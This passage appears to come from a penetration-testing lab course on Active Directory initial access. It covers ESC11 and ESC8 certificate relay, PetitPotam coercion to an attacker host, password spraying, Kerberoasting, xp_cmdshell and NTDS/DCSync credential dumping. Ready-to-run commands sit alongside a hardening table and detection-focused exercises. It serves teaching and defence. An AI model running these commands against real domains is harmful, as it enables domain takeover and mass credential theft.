[Flag: IA-028]

---

## 9.21 Cracked-cert-template misissuance — IA-029 (ESC variants without auth)

For most ESC bugs you need a valid credential first. Two exceptions stand out:

1. **ESC8** unauth — IA-024 above.
2. **ESC11** unauth — RPC enrollment endpoint with no `IF_ENFORCEENCRYPTICERTREQUEST` flag → relay over RPC.

### ESC11 vector (briefly)

```bash
sudo ntlmrelayx.py -t rpc://ca01.corp.local --adcs --template DomainController \
    -smb2support -rpc-mode RPRN -icpr-ca-name CORP-CA
# Plus coercion as in ESC8.
```

ESC11 patch is KB5014754 (CT_FLAG_NO_SECURITY_EXTENSION + RPC enforcement). DVAD leaves both off.

[Flag: IA-029 — ESC11 zero-cred path]

---

## 9.22 Anonymous AD CS RPC enumeration

If `ICPR` RPC endpoint accepts an anon bind, you can enumerate templates without LDAP:

```bash
python3 ICPRSpook.py -u '' -p '' -d corp.local --target ca01.corp.local
```

Tells you which templates a "Domain Computers" or "Domain Users" group can enroll for. Even unauth on some labs.

[Flag: IA-030 — CA RPC enum]

---

## 9.23 Combining: zero-cred attack chain (end-to-end)

```
Step | Action                                            | Output
-----+---------------------------------------------------+----------------------
  1  | nmap → dc01, ca01, sql01, file01, ws01            | port map
  2  | dig SRV → forest topology                         | trust diagram
  3  | ldapsearch anon → user list (IA-001)              | users.txt
  4  | kerbrute userenum                                 | confirmed users
  5  | kerbrute passwordspray DVADlab2024!               | peter.parker valid
  6  | impacket-GetUserSPNs -request                     | svc_jarvis kerb hash
  7  | hashcat -m 13100                                  | SqlServer123!
  8  | nxc mssql sa:SqlServer123!  xp_cmdshell           | SYSTEM on sql01
  9  | mimikatz / lsassy → svc_backup hash               | Backup Operators NT
 10  | WinRM in as svc_backup → reg save SAM,SYSTEM,NTDS | NTDS.dit
 11  | secretsdump -system system.save -ntds ntds.dit    | krbtgt
 12  | Golden TGT → DA                                   | game over
```

A real engagement rarely follows a straight line — you'll fork at each step. But the **eight-hour, zero-credentials-to-DA** chain through DVAD is realistic.

---

## 9.24 Hardening for blue side

| Initial-access path | Fix |
|---|---|
| LLMNR/NBT-NS | GPO disable + per-NIC NetBIOS off |
| WPAD | DNS sinkhole `wpad.<domain>` to localhost |
| mitm6 | Disable IPv6 OR DHCPv6 Guard on switches |
| Anonymous LDAP | RestrictAnonymous=2, LDAP signing + channel binding |
| Anonymous SMB | RestrictNullSessAccess=1, NullSessionPipes=empty |
| SYSVOL GPP | Remove all cpassword files; KB2962486 |
| ESC8 | Disable HTTP enrollment OR require EPA + HTTPS |
| ZeroLogon | KB4565351 + FullSecureChannelProtection=1 |
| noPac | KB5008380; set MachineAccountQuota=0 |
| PrintNightmare | KB5005010 + RestrictDriverInstallationToAdministrators=1 |
| MSSQL defaults | Rotate sa, disable xp_cmdshell, kerberos-only auth |
| Coercion | Disable Spooler on DCs; disable WebClient; patch EFSRPC; signing everywhere |
| Spraying | Strong lockout policy; MFA on remote endpoints |
| AS-REP roast | Clear DONT_REQ_PREAUTH on every user |
| Share-scrape | Audit share permissions; DLP; remove world-readable secrets |

---

## Lab exercises

### Exercise 9.A — Capture LLMNR

```bash
sudo responder -I dvad-ctf -wrfv -v
# Trigger from a victim:
# *Evil-WinRM* PS> net use \\NONEXIST\share /user:peter.parker DVADlab2024!
# OR rely on the DVAD scheduled task that lookups a bogus name.
```

Crack the captured NetNTLMv2. Save plaintext under `~/dvad/loot/01-ia/responder/cracked.txt`.

### Exercise 9.B — Anonymous LDAP user dump

```bash
ldapsearch -x -H ldap://10.10.0.10 -b 'DC=corp,DC=local' '(objectClass=user)' samAccountName -LLL \
    | grep '^sAMAccountName: ' | cut -d' ' -f2 > users.txt
wc -l users.txt
```

### Exercise 9.C — Coerce + ESC8 end-to-end

Even if you already have peter.parker's creds, run this without them. Then with anonymous PetitPotam blocked, run with auth.

```bash
sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
python3 PetitPotam.py -d '' -u '' -p '' attacker.corp.local 10.10.0.10
# If blocked:
python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' attacker.corp.local 10.10.0.10
```

Then PKINIT and DCSync:

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
impacket-secretsdump -hashes :<dc01$_nthash> 'corp.local/DC01$@10.10.0.10' -just-dc
```

### Exercise 9.D — Spray policy probe

Query the lockout policy. Plan a spray that stays below the threshold across a multi-hour window:

```bash
nxc smb 10.10.0.10 -u '' -p '' --pass-pol
# threshold = ?  observation = ?
# Pseudo-plan: 4 attempts/user per 30 min, 8 candidate passwords, 4 hours total.
```

### Exercise 9.E — kerbrute → spray → AS-REP

1. `kerbrute userenum` to get valid users.
2. `kerbrute passwordspray 'DVADlab2024!'` to find first cred.
3. `impacket-GetNPUsers ... -request` to AS-REP-roast everyone with DONT_REQ_PREAUTH.

Crack the AS-REP. Compare timing to the spray result.

### Exercise 9.F — Share-scrape vs manspider

Pick five hosts. Walk every readable share. Time both `smbmap -R` and `manspider --regex password`. Note which finds the actual cred-bearing file first.

### Exercise 9.G — ZeroLogon round-trip

Pre-save the DC's hash (you'll need an existing privileged path, e.g., the DVAD provisioning script's output). Then ZeroLogon, DCSync, RESTORE. Verify the DC can still replicate after restore.

```bash
# Confirm replication health
repadmin /replsummary
repadmin /showrepl dc01
```

### Exercise 9.H — Pure WPAD attack on the lab

Disable LLMNR poisoning (`-P`-only) and try WPAD against `ws01`. Time how long it takes for the lab user-simulation script to fall back to WPAD.

### Exercise 9.I — Match attacker actions to defender events

For each successful IA you ran, identify the corresponding Windows event ID(s) on the DC / victim. Cross-reference with chapter 13.

### Exercise 9.J — Write the IA report

Produce `~/dvad/loot/01-ia/IA-report.md` listing every credential captured, the vector used, the cracking time, and the next-step lateral candidate. Suitable for handing to a red-team lead at end of day-1.

---

## Self-check questions

1. Why does LLMNR succeed on default Windows networks even though DNS is configured?
2. Why does mitm6 *require waiting* (versus an instant exploit)?
3. What's the precondition for **anonymous** PetitPotam to work?
4. What's the difference between the IA-024 ESC8 vector and CRED-031's authenticated ESC8 in chapter 10?
5. Why **must** you restore the DC's machine account password after ZeroLogon?
6. The IA-007 hash you capture is "NetNTLMv2" (hashcat 5600), not the NT hash (mode 1000). Why? Could you pass-the-hash with the NetNTLMv2 directly?
7. Why is `kerbrute userenum` quieter than `nxc smb -u users.txt -p ''`?
8. The SYSVOL `cpassword` AES key was published by Microsoft. Why didn't they roll the key?
9. Why does `--delegate-access` on ntlmrelayx require `MachineAccountQuota > 0`?
10. What's the simplest one-line LDAP filter that catches AS-REP-roastable users?
11. Why does SpoolSample succeed against a DC even though "DCs shouldn't run Spooler"?
12. PrintNightmare can install a driver `\\attacker\evil.dll`. What pulls the driver onto the victim — SMB? HTTP? Why does this matter for firewall design?
13. Why does noPac's TGT come back impersonating Administrator even though the attacker is a low-priv user?
14. How would you detect IA-001 (anonymous LDAP enum) in event logs?
15. The IA chain ending in DA usually crosses three protocols. Name a typical triple and the credential format that crosses each boundary.
16. Why does Responder offer SMB AND HTTP by default — what attack windows does each cover?
17. mitm6 + ntlmrelayx with `-t ldap://...` (not ldaps) often fails. Why?
18. If you crack a NetNTLMv2 hash, do you get the NT hash? Or only plaintext?
19. What's the smallest change a defender can make to break IA-024 entirely without disabling ADCS?
20. Why does the lab-grade `DVADlab2024!` password defeat almost every spray test even though it's "complex" by NIST rules?

---

## References

- **bruce.banner Bromberg — *The Hacker Recipes — Initial Access*** — practical onramp catalog.
- **SpecterOps blog — *Coerce Me If You Can*** — coercion deep dives.
- **MS-RPRN / MS-EFSR / MS-DFSNM / MS-FSRVP** — Microsoft protocol specs for the coercion vectors.
- **Secura — *ZeroLogon whitepaper*** — CVE-2020-1472 cryptanalysis.
- **SpecterOps — *Certified Pre-Owned*** — ADCS abuse taxonomy.
- **Microsoft — *KB5014754*** — May 2022 ADCS hardening guide.
- **dirkjanm — *Practical guide to NTLM relay & ADCS attacks***.
- **Will Schroeder — *PowerView SYSVOL/GPP password recovery***.

Next: [10-credential-access.md](10-credential-access.md).
